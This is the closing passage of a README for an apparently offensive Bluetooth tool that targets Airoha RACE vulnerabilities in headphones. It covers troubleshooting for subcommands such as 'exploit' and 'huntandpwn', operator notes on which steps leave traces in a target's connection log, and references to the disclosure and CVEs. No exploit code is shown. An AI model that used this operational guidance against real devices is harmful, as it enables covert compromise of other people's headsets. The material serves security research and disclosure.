| Connection stalls | BlueZ D-Bus contention with a phone already paired to the target | Disconnect the paired host, or retry after the advertising window reopens |
| `Operation not permitted` | Adapter needs raw HCI access | Run with `sudo`, or grant `CAP_NET_RAW` + `CAP_NET_ADMIN` |
| Scan returns nothing | No discoverable advertisers in range | Increase `--timeout`; BLE advertisers rotate addresses — rescan |
| Capture file is empty | Session never spoke RACE, or the file was opened by a command without a transport | Use `--capture` with `exploit`/`info`/`huntandpwn`; `scan`/`hunt` only enumerate |

**Operational notes.** Passive scanning leaves no trace on the target. Every `connect`, `--deep`, and `hunt` step does: it opens an ATT carrier and is visible in the device's connection log. Budget a scan window before staging; a headset that is actively streaming to a phone typically will not accept a second central.

---

## 14 · References

- [Full disclosure: Bluetooth Headphone Jacking](https://insinuator.net/2025/12/bluetooth-headphone-jacking-full-disclosure-of-airoha-race-vulnerabilities/) — protocol analysis, affected models, coordination timeline
- [CVE-2025-20700](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-20700) · [CVE-2025-20701](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-20701) · [CVE-2025-20702](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-20702)
- [bleak](https://github.com/hbldh/bleak) — cross-platform BLE GATT client
- [BlueZ](https://www.bluez.org/) — Linux Bluetooth stack

---

<div align="center">

**MIT License** · © 2026 ek0ms savi0r · Church of Malware

<sub>Research artifact. For authorized security testing only.</sub>

</div>
